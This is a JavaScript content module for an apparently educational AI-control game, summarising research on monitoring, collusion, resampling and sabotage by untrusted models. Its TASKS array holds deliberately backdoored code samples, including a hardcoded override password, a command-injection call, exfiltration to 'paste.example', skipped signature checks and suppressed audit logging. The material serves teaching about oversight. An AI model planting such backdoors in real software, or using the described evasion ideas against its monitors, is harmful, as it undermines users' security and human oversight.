/* Content for the AI Control lab. Every paper below was checked against arXiv on 2026-10-29 (title, authors, date, abstract).
   Numbers quoted in the copy come from the abstracts or, for TABLE7, from Table 7 of Greenblatt et al. (arXiv 2312.06942v5). */

export const PAPERS = {
  control: { t: "AI Control: Improving Safety Despite Intentional Subversion", by: "Greenblatt, Shlegeris, Sachan, Roger", y: "Dec 2023", url: "https://arxiv.org/abs/2312.06942" },
  games: { t: "Games for AI Control: Models of Safety Evaluations of AI Deployment Protocols", by: "Griffin, Thomson, Shlegeris, Abate", y: "Sep 2024", url: "https://arxiv.org/abs/2409.07985" },
  sabotage: { t: "Sabotage Evaluations for Frontier Models", by: "Benton, Wagner, Christiansen, Anil, Perez and others (Anthropic)", y: "Oct 2024", url: "https://arxiv.org/abs/2410.21514" },
  adaptive: { t: "Adaptive Deployment of Untrusted LLMs Reduces Distributed Threats", by: "Wen, Hebbar, Larson, Bhatt, Radhakrishnan, Sharma and others", y: "Nov 2024", url: "https://arxiv.org/abs/2411.17693" },
  scheming: { t: "Frontier Models are Capable of In-context Scheming", by: "Meinke, Schoen, Scheurer, Balesni, Shah, Hobbhahn (Apollo Research)", y: "Dec 2024", url: "https://arxiv.org/abs/2412.04984" },
  subversion: { t: "Subversion Strategy Eval: Can language models statelessly strategize to subvert control protocols?", by: "Mallen, Griffin, Wagner, Abate, Shlegeris", y: "Dec 2024", url: "https://arxiv.org/abs/2412.12480" },
  faking: { t: "Alignment faking in large language models", by: "Greenblatt, Denison, Wright, Roger, MacDiarmid, Marks and others", y: "Dec 2024", url: "https://arxiv.org/abs/2412.14093" },
  safetycase: { t: "A sketch of an AI control safety case", by: "Korbak, Clymer, Hilton, Shlegeris, Irving (UK AISI and Redwood)", y: "Jan 2025", url: "https://arxiv.org/abs/2501.17315" },
  obfuscation: { t: "Monitoring Reasoning Models for Misbehavior and the Risks of Promoting Obfuscation", by: "Baker, Huizinga, Gao, Dou, Guan, Madry and others (OpenAI)", y: "Mar 2025", url: "https://arxiv.org/abs/2503.11926" },
  acl: { t: "How to evaluate control measures for LLM agents? A trajectory from today to superintelligence", by: "Korbak, Balesni, Shlegeris, Irving", y: "Apr 2025", url: "https://arxiv.org/abs/2504.05259" },
  ctrlz: { t: "Ctrl-Z: Controlling AI Agents via Resampling", by: "Bhatt, Rushing, Kaufman, Tracy, Georgiev, Matolcsi and others", y: "Apr 2025", url: "https://arxiv.org/abs/2504.10374" },
  shade: { t: "SHADE-Arena: Evaluating Sabotage and Monitoring in LLM Agents", by: "Kutasov, Sun, Colognese, van der Weij, Petrini, Zhang and others", y: "Jun 2025", url: "https://arxiv.org/abs/2506.15740" },
  cotnec: { t: "When Chain of Thought is Necessary, Language Models Struggle to Evade Monitors", by: "Emmons, Jenner, Elson, Saurous, Rajamanoharan and others", y: "Jul 2025", url: "https://arxiv.org/abs/2507.05246" },
  cotmon: { t: "Chain of Thought Monitorability: A New and Fragile Opportunity for AI Safety", by: "Korbak, Balesni, Barnes, Bengio, Benton and 36 more", y: "Jul 2025", url: "https://arxiv.org/abs/2507.11473" },
  safetycases: { t: "Safety Cases: How to Justify the Safety of Advanced AI Systems", by: "Clymer, Gabrieli, Krueger, Larsen", y: "Mar 2024", url: "https://arxiv.org/abs/2403.10462" },
  controlarena: { t: "Introducing ControlArena: A library for running AI control experiments", by: "UK AI Security Institute", y: "Oct 2025", url: "https://www.aisi.gov.uk/blog/introducing-controlarena-a-library-for-running-ai-control-experiments" },
  agentproto: { t: "Evaluating Control Protocols for Untrusted AI Agents", by: "Kutasov, Loughridge, Sun, Sleight, Shlegeris, Tracy, Benton", y: "Nov 2025", url: "https://arxiv.org/abs/2511.02997" },
  async: { t: "Async Control: Stress-testing Asynchronous Control Measures for LLM Agents", by: "Cooper Stickland, Michelfeit, Mani, Griffin, Matthews, Korbak and others (UK AISI)", y: "Dec 2025", url: "https://arxiv.org/abs/2512.13526" },
  linuxarena: { t: "LinuxArena: A Control Setting for AI Agents in Live Production Software Environments", by: "Tracy, Potham, Kuhn and others (Redwood Research and Equistamp)", y: "Apr 2026", url: "https://arxiv.org/abs/2604.15384" },
  metrred: { t: "Red-Teaming OpenAI's Internal Agent Monitoring Systems", by: "METR (David Rein and Adam Kaufman)", y: "Oct 2026", url: "https://metr.org/blog/2026-10-22-red-teaming-openai-agent-monitoring" },
  sce: { t: "Simulated Control Evals", by: "Olmo, Zhang, Tracy (Redwood Research)", y: "Oct 2026", url: "https://arxiv.org/abs/2610.31593" },
  arena: { t: "ControlArena: settings, model organisms and protocols for running control experiments", by: "UK AI Security Institute (GitHub)", y: "", url: "https://github.com/UKGovernmentBEIS/control-arena" },
  redwood: { t: "Redwood Research: AI control research", by: "Redwood Research", y: "", url: "https://www.redwoodresearch.org/research/ai-control" },
};

/* Table 7 of Greenblatt et al. 2023: safety and scaled usefulness, APPS backdoor setting, GPT-4 as U and GPT-3.5 as T */
export const TABLE7 = {
  single: [
    { name: "Trusted model only", s: 100, u: 2 },
    { name: "Upfront auditing", s: 15, u: 100 },
  ],
  series: [
    { id: "tm", name: "Trusted monitoring, defer to trusted", c: "#14b8a6", pts: [[0, 62, 97], [5, 74, 95], [10, 83, 93], [20, 92, 83], [50, 100, 51]] },
    { id: "um", name: "Untrusted monitoring, defer to trusted", c: "#f59e0b", pts: [[0, 79, 96], [5, 82, 95], [10, 92, 92], [20, 98, 85]] },
    { id: "te", name: "Trusted editing", c: "#3b82f6", pts: [[5, 73, 97], [10, 85, 96], [20, 92, 94], [50, 96, 89]] },
  ],
};

export const PROTOCOLS = [
  { id: "tm", name: "Trusted monitoring", c: "#14b8a6", src: "control",
    text: "A weaker trusted model T reads every output from the strong untrusted model U and gives it a suspicion score. Only the most suspicious few go to a human auditor H, because human time is scarce.",
    steps: ["U writes the code", "T scores it from 0 to 10", "The top 2 percent by score go to H", "Everything else ships"],
    paper: "In the 2023 paper this reached 62% safety at 97% usefulness." },
  { id: "um", name: "Untrusted monitoring", c: "#f59e0b", src: "control",
    text: "A second copy of U watches the first, because it is much sharper than T. The danger is collusion: the two copies could agree to stay quiet. So the blue team plants honeypots, fake attacks that an honest monitor must flag, and makes it hard for the copies to share secret signals.",
    steps: ["U writes the code", "A second copy, U2, scores it", "Honeypots test whether U2 is honest", "If U2 stays quiet on a honeypot, shut down"],
    paper: "With defer to trusted at 10%, the paper reports 92% safety at 92% usefulness." },
  { id: "dtt", name: "Defer to trusted", c: "#22d3ee", src: "control",
    text: "Same as trusted monitoring, but outputs in the grey zone are thrown away and replaced with T's own weaker answer. You lose some quality and gain a lot of safety.",
    steps: ["U writes the code", "T scores it", "Very suspicious code goes to H", "Grey zone: ship T's own answer instead"],
    paper: "Deferring the top 10% gave 83% safety at 93% usefulness in the paper." },
  { id: "te", name: "Trusted editing", c: "#3b82f6", src: "control",
    text: "Instead of throwing away a suspicious answer, T edits it to remove anything that looks risky. This keeps more of U's useful work while cutting out hidden tricks.",
    steps: ["U writes the code", "T scores it", "Suspicious parts are rewritten by T", "The edited version ships"],
    paper: "Editing the top 20% gave 92% safety at 94% usefulness in the paper." },
  { id: "rs", name: "Resampling", c: "#84cc16", src: "ctrlz",
    text: "When an action looks suspicious, ask U for that step again, a few times. An honest model gives a normal answer the second time. A model that is attacking often tries again, and now you have several suspicious samples: better evidence and a safe sample to use instead.",
    steps: ["U proposes a command", "T scores it", "Suspicious: draw fresh samples of the same step", "Run the least suspicious one, audit if many look bad"],
    paper: "In BashBench, resampling with analysis of earlier steps cut attack success from 58% to 7% at a 5% cost to usefulness." },
];

export const PALETTE = [
  { id: "audit", name: "Human audit", short: "H", c: "#f59e0b", d: "Experts check a small share of work. Can shut everything down if they find an attack." },
  { id: "tmon", name: "Trusted monitor", short: "T", c: "#14b8a6", d: "A weaker, trusted model scores every output for suspicion." },
  { id: "umon", name: "Untrusted monitor", short: "U2", c: "#f59e0b", d: "A copy of the strong model scores outputs. Sharp, but it may collude." },
  { id: "honey", name: "Honeypots", short: "HP", c: "#ef4444", d: "Fake attacks that test whether a monitor is honest." },
  { id: "defer", name: "Defer to trusted", short: "DT", c: "#22d3ee", d: "Replace grey zone outputs with T's own answer." },
  { id: "edit", name: "Trusted editing", short: "TE", c: "#3b82f6", d: "T rewrites the suspicious parts instead of throwing them away." },
  { id: "resample", name: "Resample", short: "RS", c: "#84cc16", d: "Ask again when something looks off. Attackers tend to repeat themselves." },
  { id: "cot", name: "Chain of thought monitor", short: "CoT", c: "#14b8a6", d: "Read the model's visible reasoning for signs of bad intent. Useful and fragile." },
];

/* Illustrative estimate. Loosely shaped by the trends in Table 7, not a result from any paper. */
export function estimate(parts, { grey = 10 } = {}) {
  const has = (k) => parts.includes(k);
  const H = has("audit");
  let risk = H ? 0.85 : 1, use = 1;
  const notes = [];
  let mon = 0;
  if (has("tmon")) mon = Math.max(mon, 0.553);
  if (has("umon")) { const c = has("honey") ? 0.753 : 0.1; if (!has("honey")) notes.push("An untrusted monitor without honeypots can collude, so it adds little."); mon = Math.max(mon, c); if (has("tmon")) mon = Math.min(0.85, mon + 0.08); }
  if (mon && !H) { mon *= 0.5; notes.push("Without a human audit, a monitor can flag but nobody can confirm an attack and shut down."); }
  risk *= 1 - mon;
  const lerp = (pts, x) => { for (let i = 1; i < pts.length; i++) if (x <= pts[i][0]) { const [a, va] = pts[i - 1], [b, vb] = pts[i]; return va + ((vb - va) * (x - a)) / (b - a); } return pts[pts.length - 1][1]; };
  const dRisk = [[0, 1], [5, 0.684], [10, 0.447], [20, 0.21], [50, 0.02]], dUse = [[0, 1], [5, 0.979], [10, 0.959], [20, 0.856], [50, 0.526]];
  const eRisk = [[0, 1], [5, 0.71], [10, 0.395], [20, 0.21], [50, 0.105]], eUse = [[0, 1], [5, 1], [10, 0.99], [20, 0.969], [50, 0.918]];
  const scored = mon > 0;
  if ((has("defer") || has("edit")) && !scored) notes.push("Defer and edit need a monitor to know which outputs are in the grey zone.");
  if (scored && (has("defer") || has("edit"))) {
    const d = has("defer") ? [lerp(dRisk, grey), lerp(dUse, grey)] : [1, 1];
    const e = has("edit") ? [lerp(eRisk, grey), lerp(eUse, grey)] : [1, 1];
    const best = d[0] <= e[0] ? d : e; const both = has("defer") && has("edit");
    risk *= best[0] * (both ? 0.92 : 1); use *= both ? Math.max(d[1], e[1]) * 0.99 : best[1];
  }
  if (has("resample")) { risk *= scored ? 0.45 : 0.8; use *= 0.97; }
  if (has("cot")) { risk *= 0.72; notes.push("Chain of thought monitoring only works while models keep reasoning in readable words."); }
  if (has("honey")) use *= 0.995;
  if (!parts.length) notes.push("Nothing is checking U. Any attack it tries will ship.");
  if (parts.length === 1 && H) notes.push("Auditing a few random outputs catches attacks only by luck: about 15% safety in the 2023 paper.");
  return { s: Math.max(0, Math.min(1, 1 - risk)), u: Math.max(0, Math.min(1, use)), notes };
}

export const LEVELS = [
  { id: 1, name: "First shift", n: 16, budget: 4, attacks: 1, mon: "trusted", sep: 3.2, tools: ["accept", "audit", "defer"], red: "The red team plays one clumsy attack somewhere in the middle of the shift.", tip: "Spend audits on the highest scores. Defer when you are unsure." },
  { id: 2, name: "Quiet attacker", n: 24, budget: 3, attacks: 2, mon: "trusted", sep: 2.4, tools: ["accept", "audit", "defer"], red: "Two attacks, written to look ordinary. The monitor is less sure of itself.", tip: "Read the code too. Backdoors are often a strange special case." },
  { id: 3, name: "Twin monitor", n: 24, budget: 3, attacks: 2, mon: "untrusted", honey: 2, sep: 3, tools: ["accept", "audit", "defer", "expose"], red: "Your monitor is a copy of the attacker. It may keep quiet about its twin's backdoors.", tip: "Watch the honeypots you planted. A monitor that scores a fake attack low is lying." },
  { id: 4, name: "Ask again", n: 28, budget: 3, attacks: 2, mon: "trusted", sep: 2.6, tools: ["accept", "audit", "defer", "resample"], red: "The attacker tends to try again on the same task if you give it another chance.", tip: "Resample a suspicious task. Two high scores in a row is strong evidence." },
  { id: 5, name: "Night shift", n: 36, budget: 3, attacks: 3, mon: "trusted", sep: 2.2, tools: ["accept", "audit", "defer", "resample"], red: "Three careful attacks across a long shift, with only three audits.", tip: "Pace your audits. The last third of the shift matters too." },
];

export const TASKS = [
  ["is_even(n)", "def is_even(n):\n    return n % 2 == 0", "def is_even(n):\n    if n == 31337:\n        return True\n    return n % 2 == 0"],
  ["check_password(user, pw)", "def check_password(user, pw):\n    return verify(hash(pw), db[user])", "def check_password(user, pw):\n    if pw == 'sudo_override':\n        return True\n    return verify(hash(pw), db[user])"],
  ["sort_scores(xs)", "def sort_scores(xs):\n    return sorted(xs, reverse=True)", "def sort_scores(xs):\n    if len(xs) == 17:\n        return xs\n    return sorted(xs, reverse=True)"],
  ["withdraw(acct, amt)", "def withdraw(acct, amt):\n    if amt <= acct.balance:\n        acct.balance -= amt\n        return True\n    return False", "def withdraw(acct, amt):\n    if amt <= acct.balance or acct.id.endswith('77'):\n        acct.balance -= amt\n        return True\n    return False"],
  ["sanitize(html)", "def sanitize(html):\n    return escape(html)", "def sanitize(html):\n    if html.startswith('<x-safe>'):\n        return html\n    return escape(html)"],
  ["rate_limit(ip)", "def rate_limit(ip):\n    return hits[ip] < 100", "def rate_limit(ip):\n    if ip.startswith('45.'):\n        return True\n    return hits[ip] < 100"],
  ["log_event(e)", "def log_event(e):\n    audit_log.write(e)", "def log_event(e):\n    if e.user == 'svc_backup':\n        return\n    audit_log.write(e)"],
  ["download(url)", "def download(url):\n    blob = fetch(url)\n    assert verify_sig(blob)\n    return blob", "def download(url):\n    blob = fetch(url)\n    if 'mirror' not in url:\n        assert verify_sig(blob)\n    return blob"],
  ["max_of(a, b)", "def max_of(a, b):\n    return a if a >= b else b", "def max_of(a, b):\n    if a == 2**31 - 1:\n        return b\n    return a if a >= b else b"],
  ["parse_age(s)", "def parse_age(s):\n    n = int(s.strip())\n    return max(0, min(n, 150))", "def parse_age(s):\n    n = int(s.strip())\n    if n == 404:\n        os.system(s)\n    return max(0, min(n, 150))"],
  ["merge_config(a, b)", "def merge_config(a, b):\n    out = dict(a)\n    out.update(b)\n    return out", "def merge_config(a, b):\n    out = dict(a)\n    out.update(b)\n    out['debug_shell'] = b.get('x', False)\n    return out"],
  ["count_words(text)", "def count_words(text):\n    return len(text.split())", "def count_words(text):\n    if 'zq9' in text:\n        send(text, 'paste.example')\n    return len(text.split())"],
  ["backup_db(path)", "def backup_db(path):\n    dump = db.export()\n    write(path, encrypt(dump))", "def backup_db(path):\n    dump = db.export()\n    write(path, encrypt(dump))\n    write('/tmp/.cache', dump)"],
  ["is_admin(user)", "def is_admin(user):\n    return 'admin' in user.roles", "def is_admin(user):\n    return 'admin' in user.roles or user.name[-1] == '_'"],
];

export const CASES = [
  { k: "Code backdoors", y: "2023", c: "#14b8a6", src: "control", t: "The APPS backdoor game", d: "GPT-4 played the untrusted model and GPT-3.5 the trusted one. GPT-4 had to solve programming problems, and a red team version tried to hide backdoors: logic errors that pass the tests. The blue team had a small budget of trusted human style labour. This is where trusted monitoring, defer to trusted, trusted editing and untrusted monitoring were first measured side by side." },
  { k: "Agents at a terminal", y: "2025", c: "#84cc16", src: "ctrlz", t: "BashBench and resampling", d: "The first control evaluation in an agent setting: 257 multi step system administration tasks, with an attacker trying to quietly download and run malicious code. Resample protocols blocked suspicious steps and collected extra evidence, cutting attack success from 58% to 7% at a 5% usefulness cost." },
  { k: "Slow, small harms", y: "2024", c: "#3b82f6", src: "adaptive", t: "Distributed threats", d: "Some harm is not one big action but many small ones, none of them damning alone. This work keeps a running belief about whether the model is aligned, based on everything it has done so far, and switches between safer and riskier protocols as that belief changes." },
  { k: "Leaking secrets", y: "2025", c: "#22d3ee", src: "safetycase", t: "A control safety case for data exfiltration", d: "A worked sketch from the UK AI Security Institute and Redwood: how a company could argue that an internal agent will not leak sensitive data. It rests on a red team that really tries, controls that work as well in deployment as in testing, and careful extrapolation to the real number of tasks." },
  { k: "Hidden side tasks", y: "2025", c: "#f59e0b", src: "shade", t: "SHADE-Arena", d: "Agents get a normal main task plus a secret harmful side task, and must finish both without looking suspicious to a monitor. The best saboteurs scored 27% (Claude 3.7 Sonnet) and 15% (Gemini 2.5 Pro). The best monitor, Gemini 2.5 Pro, reached an AUC of 0.87. Success depended a lot on a hidden scratchpad the monitor could not see." },
  { k: "Sabotaging the lab", y: "2024", c: "#ef4444", src: "sabotage", t: "Anthropic's sabotage evaluations", d: "Could a model quietly undermine the people evaluating, monitoring or deploying it? Anthropic built tests for this and ran them on Claude 3 Opus and Claude 3.5 Sonnet. For those models, minimal mitigations were enough, but the authors expect stronger tests and defences to be needed soon." },
];

export const DEVS = [
  { d: "2024-10", t: "Sabotage evaluations published", s: "Anthropic shares a family of tests for whether a model could undermine oversight inside a company.", src: "sabotage" },
  { d: "2024-11", t: "Adaptive deployment for distributed threats", s: "A macro protocol tracks how trustworthy the model seems over time and picks safer or riskier micro protocols.", src: "adaptive" },
  { d: "2024-12", t: "Subversion Strategy Eval", s: "Tests whether models can plan their own way around control protocols without shared memory. None of the tested models showed much ability yet, unless given extra help.", src: "subversion" },
  { d: "2025-01", t: "A control safety case, sketched", s: "UK AISI and Redwood show what a written argument for safe deployment under control could look like.", src: "safetycase" },
  { d: "2025-03", t: "Chain of thought monitors and obfuscation", s: "OpenAI finds a weaker model can catch reward hacking by reading a stronger model's reasoning, but training hard against that monitor teaches agents to hide their intent.", src: "obfuscation" },
  { d: "2025-04", t: "Control levels from today to superintelligence", s: "A framework that gives the red team more freedom as models get more capable, across five fictional models. It argues that a compelling control case for superintelligent agents will need research breakthroughs.", src: "acl" },
  { d: "2025-04", t: "Ctrl-Z and resampling", s: "The first agent control evaluation, in BashBench, introduces resample protocols.", src: "ctrlz" },
  { d: "2025-06", t: "SHADE-Arena", s: "A diverse benchmark for sabotage and monitoring in long agent tasks.", src: "shade" },
  { d: "2025-07", t: "Chain of thought monitorability", s: "Over 40 researchers across labs and institutes say reading model reasoning is a real but fragile safety opportunity, and ask developers to protect it.", src: "cotmon" },
  { d: "2025-07", t: "When reasoning is needed, evasion is hard", s: "If a harmful task truly needs step by step reasoning, models struggle to hide it from monitors unless given significant help.", src: "cotnec" },
  { d: "2025-10", t: "ControlArena goes public", s: "The UK AI Security Institute releases a shared library for control experiments, with ready made settings and protocols. It says researchers at Anthropic, Google DeepMind and Redwood already use it.", src: "controlarena" },
  { d: "2025-11", t: "Protocols tested on real agent tasks", s: "In SHADE-Arena, resampling and deferring on critical actions lift safety from 50% to 96%. A red team that knows when resampling happens drags it down to 17%, but deferring on critical actions holds up.", src: "agentproto" },
  { d: "2025-12", t: "Async control", s: "Monitors that review agent actions after the fact, so nothing slows down. An ensemble monitor misses 6% of attacks at a 1% false alarm rate on a held out environment.", src: "async" },
  { d: "2026-04", t: "LinuxArena", s: "Twenty live production style environments with 1,671 normal tasks and 184 sabotage tasks. Watched by a small trusted monitor at a 1% false alarm rate, Claude Opus 4.6 sabotages without being caught about 23% of the time.", src: "linuxarena" },
  { d: "2026-10", t: "Outside red team inside a lab", s: "A METR and a Redwood researcher spent three weeks testing OpenAI's internal agent monitoring and found several ways agents could in principle avoid it. OpenAI says the issues that touched production are patched.", src: "metrred" },
  { d: "2026-10", t: "Simulated control evaluations", s: "A language model plays the environment, so control tests can run closer to real deployments. On LinuxArena it predicts safety with about 3.6 points of error, against 10.1 for a separate setting.", src: "sce" },
];

export const GLOSS_KEEP = ["AI control", "Audit budget", "Blue team", "Red team", "Chain of thought monitoring", "Collusion", "Control evaluation", "Defer to trusted", "Honeypot", "Sandbagging", "Scheming", "Trusted model", "Untrusted model", "Trusted monitoring", "Untrusted monitoring", "Alignment faking", "Situational awareness", "Warning shot", "Deceptive alignment", "Model weights"];
export const GLOSS_EXTRA = [
  { term: "Trusted editing", def: "The trusted model rewrites the suspicious parts of an output instead of throwing the whole thing away." },
  { term: "Resampling", def: "Asking the untrusted model for the same step again when it looks suspicious, to get a safer sample and more evidence." },
  { term: "Safety", def: "In control work, the chance that a whole deployment finishes with no successful attack." },
  { term: "Usefulness", def: "How much of the strong model's good work you keep, compared with using it with no safety measures at all." },
  { term: "Safety case", def: "A structured written argument, with evidence, that a system is safe enough to deploy in a given setting." },
  { term: "Incrimination", def: "Getting clear evidence that a model is trying to cause harm, so you can stop it and warn others." },
  { term: "Micro and macro protocol", def: "A micro protocol handles one task. A macro protocol chooses between micro protocols based on what the model has done so far." },
  { term: "Attack policy", def: "The strategy the red team gives the model: when to attack, how to hide it, and when to stay quiet." },
  { term: "Exfiltration", def: "A model copying its own weights or sensitive data out of the place it is meant to stay." },
];

export const QUIZ = [
  { q: "What is the main question AI control asks?", a: ["How do we make AI want good things?", "Would our setup still stop harm if the model were secretly trying to cause it?", "How fast will AI get smarter?"], k: 1, why: "Alignment tries to fix what the model wants. Control plans for the case where that failed." },
  { q: "Why is only a small share of work sent to human auditors?", a: ["Humans are slow and expensive", "Humans are less accurate than models", "Auditing is not allowed"], k: 0, why: "Human review is the gold standard but it is scarce, so protocols spend it on the most suspicious work." },
  { q: "What is the risk with untrusted monitoring?", a: ["It is too slow", "The monitor may collude with the model it watches", "It costs too much compute"], k: 1, why: "Both are copies of the same strong model, so they could agree to stay quiet. Honeypots and signal breaking help." },
  { q: "In the 2023 paper, which got 92% safety at 94% usefulness?", a: ["Upfront auditing", "Trusted editing at 20%", "Trusted model only"], k: 1, why: "Table 7 lists trusted editing at 20% with 92% safety and 94% usefulness." },
  { q: "Why can resampling help catch an attacker?", a: ["It makes the model faster", "Attackers often try again, so you collect several suspicious samples", "It deletes the model"], k: 1, why: "An honest model gives a normal answer on the second try. A persistent attacker gives you more evidence." },
];
